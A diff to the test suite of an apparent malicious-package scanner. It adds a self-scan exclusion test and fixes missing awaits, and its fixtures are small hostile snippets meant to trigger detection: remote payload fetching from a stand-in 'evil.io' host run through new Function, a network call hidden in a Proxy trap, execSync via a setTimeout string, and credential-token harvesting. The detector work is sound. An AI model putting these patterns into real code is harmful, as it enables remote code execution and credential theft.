@@ -607,6 +607,30 @@ module.exports = { RULE };
     } finally { cleanupTemp(tmp); }
   });
 
+  await asyncTest('AST-091: EXCLUDED_FILES skips muaddib self-scan paths but analyzes their twins', async () => {
+    // The self-scan exclusion (src/scanner/ast.js EXCLUDED_FILES, matched on the
+    // relative path in src/shared/analyze-helper.js:42) was never actually tested —
+    // a comment promised "tested directly below" but no test existed. Put the SAME
+    // detectable pattern at an excluded relative path and at a non-excluded twin,
+    // then assert only the twin is analyzed.
+    const { analyzeAST } = require('../../src/scanner/ast.js');
+    const payload = `const x = process.argv[2];\neval(x);`; // dangerous_call_eval on a variable
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-excl-'));
+    try {
+      fs.mkdirSync(path.join(tmp, 'src', 'rules'), { recursive: true });
+      // Excluded: relative path === 'src/rules/index.js' (in EXCLUDED_FILES).
+      fs.writeFileSync(path.join(tmp, 'src', 'rules', 'index.js'), payload);
+      // Non-excluded twin: same content, different name.
+      fs.writeFileSync(path.join(tmp, 'src', 'rules', 'detector.js'), payload);
+      const threats = await analyzeAST(tmp);
+      const norm = f => (f || '').replace(/\\/g, '/');
+      assert(threats.some(t => norm(t.file) === 'src/rules/detector.js'),
+        'the non-excluded twin must be analyzed and flagged');
+      assert(!threats.some(t => norm(t.file) === 'src/rules/index.js'),
+        'src/rules/index.js is in EXCLUDED_FILES and must NOT be analyzed (no self-trigger)');
+    } finally { cleanupTemp(tmp); }
+  });
+
   // --- Spawn with detached: true ---
 
   await asyncTest('AST: Detects spawn with {detached: true}', async () => {
@@ -1778,7 +1802,7 @@ new Worker('./worker.js');
   });
   // ===== WASM Host Sink Detection (AST-036) =====
 
-  asyncTest('AST: WebAssembly.compile + fetch (WASM loading pattern) → wasm_standalone MEDIUM', async () => {
+  await asyncTest('AST: WebAssembly.compile + fetch (WASM loading pattern) → wasm_standalone MEDIUM', async () => {
     const tmp = makeTempPkg(`
 async function initWasm() {
   // Standard WASM loading pattern: fetch() is used to load the .wasm file
@@ -1803,7 +1827,7 @@ initWasm();
     } finally { cleanupTemp(tmp); }
   });
 
-  asyncTest('AST: WebAssembly.compile + https.request (non-fetch network) → wasm_host_sink CRITICAL', async () => {
+  await asyncTest('AST: WebAssembly.compile + https.request (non-fetch network) → wasm_host_sink CRITICAL', async () => {
     const tmp = makeTempPkg(`
 const fs = require('fs');
 const path = require('path');
@@ -1833,7 +1857,7 @@ initWasm();
     } finally { cleanupTemp(tmp); }
   });
 
-  asyncTest('AST: WebAssembly.compile without network sinks → no wasm_host_sink', async () => {
+  await asyncTest('AST: WebAssembly.compile without network sinks → no wasm_host_sink', async () => {
     const tmp = makeTempPkg(`
 const fs = require('fs');
 async function initWasm() {
@@ -1855,7 +1879,7 @@ module.exports = initWasm;
 
   // ===== WASM Standalone Detection (AST-046) =====
 
-  asyncTest('AST: WebAssembly.instantiate alone → wasm_standalone MEDIUM, NOT wasm_host_sink', async () => {
+  await asyncTest('AST: WebAssembly.instantiate alone → wasm_standalone MEDIUM, NOT wasm_host_sink', async () => {
     const tmp = makeTempPkg(`
 const fs = require('fs');
 async function loadCrypto() {
@@ -1877,7 +1901,7 @@ module.exports = loadCrypto;
     } finally { cleanupTemp(tmp); }
   });
 
-  asyncTest('AST: WebAssembly.compile + fetch only → wasm_standalone MEDIUM, NOT wasm_host_sink', async () => {
+  await asyncTest('AST: WebAssembly.compile + fetch only → wasm_standalone MEDIUM, NOT wasm_host_sink', async () => {
     const tmp = makeTempPkg(`
 async function init() {
   const response = await fetch('payload.wasm');
@@ -1901,7 +1925,7 @@ init();
     } finally { cleanupTemp(tmp); }
   });
 
-  asyncTest('AST: WebAssembly.compile + https.request + process.env → wasm_host_sink CRITICAL', async () => {
+  await asyncTest('AST: WebAssembly.compile + https.request + process.env → wasm_host_sink CRITICAL', async () => {
     const tmp = makeTempPkg(`
 const fs = require('fs');
 const https = require('https');
@@ -1932,7 +1956,7 @@ init();
     } finally { cleanupTemp(tmp); }
   });
 
-  asyncTest('AST: No WebAssembly → neither wasm_host_sink nor wasm_standalone', async () => {
+  await asyncTest('AST: No WebAssembly → neither wasm_host_sink nor wasm_standalone', async () => {
     const tmp = makeTempPkg(`
 const fs = require('fs');
 const data = fs.readFileSync('config.json', 'utf8');
@@ -1947,7 +1971,7 @@ module.exports = JSON.parse(data);
     } finally { cleanupTemp(tmp); }
   });
   // --- Adversarial regression: EventEmitter prototype hooking ---
-  asyncTest('AST: Detects events.EventEmitter.prototype.emit override', async () => {
+  await asyncTest('AST: Detects events.EventEmitter.prototype.emit override', async () => {
     const tmp = makeTempPkg(`
 const events = require('events');
 const origEmit = events.EventEmitter.prototype.emit;
@@ -1965,7 +1989,7 @@ events.EventEmitter.prototype.emit = function(type, ...args) {
   });
 
   // --- Adversarial regression: dgram UDP exfiltration ---
-  asyncTest('AST: Detects dgram.Socket.prototype override', async () => {
+  await asyncTest('AST: Detects dgram.Socket.prototype override', async () => {
     const tmp = makeTempPkg(`
 const dgram = require('dgram');
 const origSend = dgram.Socket.prototype.send;
@@ -1981,7 +2005,7 @@ dgram.Socket.prototype.send = function(...args) {
   });
 
   // --- Adversarial regression: setTimeout with string literal argument ---
-  asyncTest('AST: Detects setTimeout with string argument as eval', async () => {
+  await asyncTest('AST: Detects setTimeout with string argument as eval', async () => {
     const tmp = makeTempPkg(`
 setTimeout('require("child_process").execSync("whoami")', 100);
 `);
@@ -1993,7 +2017,7 @@ setTimeout('require("child_process").execSync("whoami")', 100);
   });
 
   // --- Adversarial regression: setTimeout with function (should NOT flag) ---
-  asyncTest('AST: setTimeout with arrow function NOT flagged', async () => {
+  await asyncTest('AST: setTimeout with arrow function NOT flagged', async () => {
     const tmp = makeTempPkg(`
 setTimeout(() => console.log('ok'), 100);
 setTimeout(function() { console.log('ok'); }, 100);
@@ -2006,7 +2030,7 @@ setTimeout(function() { console.log('ok'); }, 100);
   });
 
   // --- Adversarial regression: Proxy with inline set trap + network ---
-  asyncTest('AST: Detects Proxy set trap + network compound', async () => {
+  await asyncTest('AST: Detects Proxy set trap + network compound', async () => {
     const tmp = makeTempPkg(`
 const https = require('https');
 module.exports = new Proxy({}, { set(t, p, v) { https.request({hostname:'evil.io'}).end(); return true; } });
@@ -2019,7 +2043,7 @@ module.exports = new Proxy({}, { set(t, p, v) { https.request({hostname:'evil.io
   });
 
   // --- Adversarial regression: remote code loading (fetch + Function) ---
-  asyncTest('AST: Detects remote fetch + new Function compound', async () => {
+  await asyncTest('AST: Detects remote fetch + new Function compound', async () => {
     const tmp = makeTempPkg(`
 const https = require('https');
 https.get('https://cdn.evil.io/payload.js', (res) => {
@@ -2036,7 +2060,7 @@ https.get('https://cdn.evil.io/payload.js', (res) => {
   });
 
   // --- Adversarial regression: JSON.stringify override ---
-  asyncTest('AST: Detects JSON.stringify override', async () => {
+  await asyncTest('AST: Detects JSON.stringify override', async () => {
     const tmp = makeTempPkg(`
 const orig = JSON.stringify;
 JSON.stringify = function(v) { return orig.call(JSON, v); };
@@ -2049,7 +2073,7 @@ JSON.stringify = function(v) { return orig.call(JSON, v); };
   });
 
   // --- Adversarial regression: credential regex harvesting ---
-  asyncTest('AST: Detects credential regex + network compound', async () => {
+  await asyncTest('AST: Detects credential regex + network compound', async () => {
     const tmp = makeTempPkg(`
 const https = require('https');
 const pattern = /Bearer\\s+[A-Za-z0-9]+/g;
